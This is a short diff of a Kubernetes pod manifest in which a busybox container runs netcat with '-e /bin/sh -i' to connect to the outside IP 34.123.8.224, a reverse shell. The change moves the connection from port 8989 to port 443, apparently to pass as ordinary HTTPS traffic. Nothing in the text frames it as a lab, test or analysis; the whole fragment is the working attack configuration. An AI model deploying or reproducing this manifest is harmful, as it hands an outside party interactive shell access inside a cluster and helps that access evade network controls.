@@ -9,7 +9,7 @@ spec:
   - name: busybox
     image: busybox
     command: ["/bin/nc"]
-    args: ["34.123.8.224", "8989", "-e", "/bin/sh", "-i"]
+    args: ["34.123.8.224", "443", "-e", "/bin/sh", "-i"]
     stdin: true
     tty: true
     securityContext:
